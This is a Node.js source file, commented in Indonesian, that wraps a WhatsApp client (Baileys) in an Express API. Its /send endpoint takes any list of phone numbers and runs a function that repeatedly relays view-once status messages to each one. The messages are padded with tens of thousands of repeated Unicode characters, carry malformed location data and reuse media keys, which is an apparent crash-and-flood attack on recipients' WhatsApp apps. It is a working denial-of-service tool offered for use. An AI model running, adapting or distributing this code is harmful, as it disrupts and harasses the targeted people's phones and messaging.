import makeWASocket, {
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    proto,
    DisconnectReason
} from '@whiskeysockets/baileys'
import qrcode from 'qrcode-terminal'
import pino from 'pino'
import fs from 'fs'
import express from 'express'
import path from 'path'

// Suppress verbose libsignal logs
console.info = () => { }

// ─────────────────────────────────────────────
// Config
// ─────────────────────────────────────────────
const PORT = process.env.PORT || 3001
const DEFAULT_AUTH_DIR = './auth_bypass'

// In-memory config (dapat diubah via API)
let config = {
    authDir: DEFAULT_AUTH_DIR,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    logLevel: 'silent',
}

// ─────────────────────────────────────────────
// State global socket
// ─────────────────────────────────────────────
let sock = null
let isConnected = false
let qrCache = null
let reconnectAttempts = 0
const MAX_RECONNECT = 10

// ─────────────────────────────────────────────
// Helper
// ─────────────────────────────────────────────
const delay = (ms) => new Promise((res) => setTimeout(res, ms))

function cleanAuth(dir) {
    try {
        fs.rmSync(dir, { recursive: true, force: true })
        console.log(`🧹 Auth folder "${dir}" dihapus.`)
    } catch (e) {
        console.error('Gagal hapus auth folder:', e.message)
    }
}

// ─────────────────────────────────────────────
// Start / reconnect socket
// ─────────────────────────────────────────────
async function startSocket() {
    if (reconnectAttempts >= MAX_RECONNECT) {
        console.error('❌ Melebihi batas reconnect. Hentikan percobaan.')
        return
    }

    const { state, saveCreds } = await useMultiFileAuthState(config.authDir)
    const { version } = await fetchLatestBaileysVersion()

    sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: config.logLevel }),
        browser: config.browser,
    })

    sock.ev.on('creds.update', saveCreds)

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update

        if (qr) {
            qrCache = qr
            console.log('\n📲 QR Code tersedia — scan via endpoint GET /qr atau terminal:\n')
            qrcode.generate(qr, { small: true })
        }

        if (connection === 'open') {
            isConnected = true
            qrCache = null
            reconnectAttempts = 0
            console.log('✅ WhatsApp Connected!')
        }

        if (connection === 'close') {
            isConnected = false
            const statusCode = lastDisconnect?.error?.output?.statusCode
            const reason = lastDisconnect?.error?.message || String(lastDisconnect?.error)
            console.log(`❌ Disconnected. Code: ${statusCode} | Reason: ${reason}`)

            const shouldClean = [
                DisconnectReason.loggedOut,
                DisconnectReason.badSession,
            ].includes(statusCode)
                || reason.includes('Connection Failure')
                || reason.includes('Precondition Required')
                || reason.includes('Stream Errored')

            if (shouldClean) {
                console.log('🧹 Session korup / logout — hapus auth & restart...')
                cleanAuth(config.authDir)
            }

            const isLoggedOut = statusCode === DisconnectReason.loggedOut
            if (!isLoggedOut) {
                reconnectAttempts++
                const backoff = Math.min(3000 * reconnectAttempts, 30000)
                console.log(`🔄 Reconnect ke-${reconnectAttempts} dalam ${backoff / 1000}s...`)
                setTimeout(startSocket, backoff)
            } else {
                console.log('🚫 Session logged out. Perlu scan QR baru.')
                reconnectAttempts = 0
                setTimeout(startSocket, 3000)
            }
        }
    })
}

// ─────────────────────────────────────────────
// Express API
// ─────────────────────────────────────────────
const app = express()
app.use(express.json())

// ── Middleware: cek koneksi untuk endpoint yang butuh socket ──
function requireConnection(req, res, next) {
    if (!isConnected || !sock) {
        return res.status(503).json({
            ok: false,
            error: 'WhatsApp belum terhubung.',
            hint: isConnected ? null : 'Cek GET /status atau GET /qr untuk scan QR.'
        })
    }
    next()
}

// ── GET /status ──────────────────────────────
app.get('/status', (req, res) => {
    res.json({
        ok: true,
        connected: isConnected,
        qrPending: !!qrCache,
        reconnectAttempts,
        config: {
            authDir: config.authDir,
            browser: config.browser,
            logLevel: config.logLevel,
        }
    })
})

// ── GET /qr ──────────────────────────────────
// Ambil QR code sebagai string (untuk dirender di frontend)
app.get('/qr', (req, res) => {
    if (isConnected) {
        return res.json({ ok: true, connected: true, qr: null })
    }
    if (!qrCache) {
        return res.json({ ok: false, error: 'QR belum tersedia, tunggu sebentar...' })
    }
    res.json({ ok: true, connected: false, qr: qrCache })
})

// ── POST /send ───────────────────────────────
// Kirim pesan teks / media ke satu atau banyak nomor
// Body: { targets: ["628xxx", ...], message: "...", options: {...} }
app.post('/send', requireConnection, async (req, res) => {
    const { targets } = req.body

    if (!targets || (!Array.isArray(targets) && typeof targets !== 'string')) {
        return res.status(400).json({ ok: false, error: '`targets` harus string atau array nomor WA.' })
    }

    // Format target secara otomatis jika hanya memasukkan nomor telepon saja
    const rawList = Array.isArray(targets) ? targets : [targets]
    const list = rawList.map(t => {
        let formatted = t.trim()
        if (!formatted.includes('@')) {
            formatted = `${formatted.replace(/[^0-9]/g, '')}@s.whatsapp.net`
        }
        return formatted
    })

    // Jalankan masing-masing target di background agar langsung return respon ke client
    for (let target of list) {
        Ipongforcloseivs(sock, target).catch(err => {
            console.error(`Error sending to target ${target}:`, err)
        })
    }

    res.json({
        ok: true,
        message: 'Proses pengiriman payload Closeivs telah dimulai di background.',
        targets: list
    })
})

// ── POST /config ─────────────────────────────
// Update konfigurasi auth (authDir, browser, logLevel)
// Body: { authDir?: "...", browser?: [...], logLevel?: "..." }
app.post('/config', async (req, res) => {
    const { authDir, browser, logLevel } = req.body
    const changed = []

    if (authDir && authDir !== config.authDir) {
        config.authDir = authDir
        changed.push('authDir')
    }
    if (browser && Array.isArray(browser) && browser.length === 3) {
        config.browser = browser
        changed.push('browser')
    }
    if (logLevel) {
        config.logLevel = logLevel
        changed.push('logLevel')
    }

    res.json({
        ok: true,
        message: changed.length
            ? `Config diupdate: ${changed.join(', ')}. Restart socket untuk apply.`
            : 'Tidak ada perubahan config.',
        current: config,
    })
})

// ── POST /auth/reset ─────────────────────────
// Hapus session auth & reconnect (paksa QR baru)
app.post('/auth/reset', async (req, res) => {
    const { authDir } = req.body  // optional: override dir
    const targetDir = authDir || config.authDir

    if (sock) {
        try { sock.end() } catch (_) { }
        sock = null
        isConnected = false
    }

    cleanAuth(targetDir)
    reconnectAttempts = 0

    // Restart socket
    setTimeout(startSocket, 1500)

    res.json({
        ok: true,
        message: `Session "${targetDir}" dihapus. Socket akan restart & QR baru akan muncul.`,
    })
})

// ── POST /auth/switch ────────────────────────
// Pindah ke auth directory lain (multi-session sederhana)
// Body: { authDir: "./auth_session2" }
app.post('/auth/switch', async (req, res) => {
    const { authDir } = req.body
    if (!authDir) {
        return res.status(400).json({ ok: false, error: '`authDir` wajib diisi.' })
    }

    if (sock) {
        try { sock.end() } catch (_) { }
        sock = null
        isConnected = false
    }

    config.authDir = authDir
    reconnectAttempts = 0
    setTimeout(startSocket, 1500)

    res.json({
        ok: true,
        message: `Pindah ke session "${authDir}". Scan QR kalau session belum ada.`,
    })
})

// ── POST /socket/restart ─────────────────────
// Restart socket tanpa hapus session
app.post('/socket/restart', async (req, res) => {
    if (sock) {
        try { sock.end() } catch (_) { }
        sock = null
        isConnected = false
    }
    reconnectAttempts = 0
    setTimeout(startSocket, 1500)

    res.json({ ok: true, message: 'Socket direstart. Akan reconnect dalam 1.5s.' })
})

// ─────────────────────────────────────────────
// Boot
// ─────────────────────────────────────────────
app.listen(PORT, () => {
    console.log(`🚀 WA API berjalan di http://localhost:${PORT}`)
    console.log(`   GET  /status         — cek koneksi & config`)
    console.log(`   GET  /qr             — ambil QR string`)
    console.log(`   POST /send           — kirim pesan`)
    console.log(`   POST /config         — update konfigurasi`)
    console.log(`   POST /auth/reset     — hapus session & paksa QR baru`)
    console.log(`   POST /auth/switch    — ganti auth directory`)
    console.log(`   POST /socket/restart — restart socket`)
})




async function Ipongforcloseivs(sock, target) {
    if (!target.includes('@')) {
        target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`
    }
    console.log(`[Ipongforcloseivs] Mengirim payload ke: ${target}`)

    for (let i = 0; i < 50; i++) {
        console.log(`[Ipongforcloseivs] [${target}] Putaran ${i + 1}/50`)

        const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
        const s = "𑇂𑆵𑆴𑆿".repeat(60000);
        try {
            let locationMessagex = {
                degreesLatitude: 11.11,
                degreesLongitude: -11.11,
                name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
                url: "https://t.me/elyssavirellequeenn",
            }
            let msgx = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        locationMessagex
                    }
                }
            }, {});
            let extendMsgx = {
                extendedTextMessage: {
                    text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
                    matchedText: "helow",
                    description: "𑇂𑆵𑆴𑆿".repeat(60000),
                    title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
                    previewType: "NONE",
                    jpegThumbnail: "",
                    thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                    thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                    thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                    mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                    mediaKeyTimestamp: "1743101489",
                    thumbnailHeight: 641,
                    thumbnailWidth: 640,
                    inviteLinkGroupTypeV2: "DEFAULT"
                }
            }
            let msgx2 = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        extendMsgx
                    }
                }
            }, {});
            let locationMessage = {
                degreesLatitude: -9.09999262999,
                degreesLongitude: 199.99963118999,
                jpegThumbnail: null,
                name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
                url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
            }
            let msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        locationMessage
                    }
                }
            }, {});
            let extendMsg = {
                extendedTextMessage: {
                    text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone,
                    matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
                    description: "𑇂𑆵𑆴𑆿".repeat(25000),
                    title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
                    previewType: "NONE",
                    jpegThumbnail: "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",
                    thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                    thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                    thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                    mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                    mediaKeyTimestamp: "1743101489",
                    thumbnailHeight: 641,
                    thumbnailWidth: 640,
                    inviteLinkGroupTypeV2: "DEFAULT"
                }
            }
            let msg2 = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        extendMsg
                    }
                }
            }, {});
            let msg3 = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        locationMessage
                    }
                }
            }, {});

            for (let i = 0; i < 10; i++) {
                await sock.relayMessage('status@broadcast', msg.message, {
                    messageId: msg.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: {
                                    jid: target
                                },
                                content: undefined
                            }]
                        }]
                    }]
                });

                await sock.relayMessage('status@broadcast', msg2.message, {
                    messageId: msg2.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: {
                                    jid: target
                                },
                                content: undefined
                            }]
                        }]
                    }]
                });
                await sock.relayMessage('status@broadcast', msg.message, {
                    messageId: msgx.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: {
                                    jid: target
                                },
                                content: undefined
                            }]
                        }]
                    }]
                });
                await sock.relayMessage('status@broadcast', msg2.message, {
                    messageId: msgx2.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: {
                                    jid: target
                                },
                                content: undefined
                            }]
                        }]
                    }]
                });

                await sock.relayMessage('status@broadcast', msg3.message, {
                    messageId: msg2.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: {
                                    jid: target
                                },
                                content: undefined
                            }]
                        }]
                    }]
                });
                if (i < 9) {
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
            }
        } catch (err) {
            console.error(err);
        }
    }
};

startSocket()

